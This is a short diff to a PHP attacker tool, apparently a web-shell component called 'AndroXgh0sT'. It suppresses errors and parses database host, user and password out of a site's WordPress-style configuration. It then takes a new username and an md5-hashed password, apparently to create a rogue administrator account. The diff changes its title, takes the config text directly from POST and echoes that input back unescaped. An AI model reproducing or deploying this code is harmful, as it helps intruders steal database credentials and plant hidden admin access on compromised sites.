@@ -1,4 +1,4 @@
-<title>AndroXgh0sT</title>
+<title>./Xi4u7 <3</title>
 <?php
 error_reporting(0);
 
@@ -11,13 +11,13 @@ function ambilKata($param, $kata1, $kata2){
     return $return;
 }
 if(isset($_POST['hajar'])) {
+	echo $_POST["config"];
 	if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
 		echo "username atau password harus lebih dari 6 karakter";
 	} else {
 		$user_baru = $_POST['user_baru'];
 		$pass_baru = md5($_POST['pass_baru']);
-		$file_conf = $_POST['config_dir'];
-		$config = file_get_contents("$file_conf");
+		$config = $_POST["config"];
 		$dbhost = ambilkata($config,"DB_HOST', '","'");
 		$dbuser = ambilkata($config,"DB_USER', '","'");
 		$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
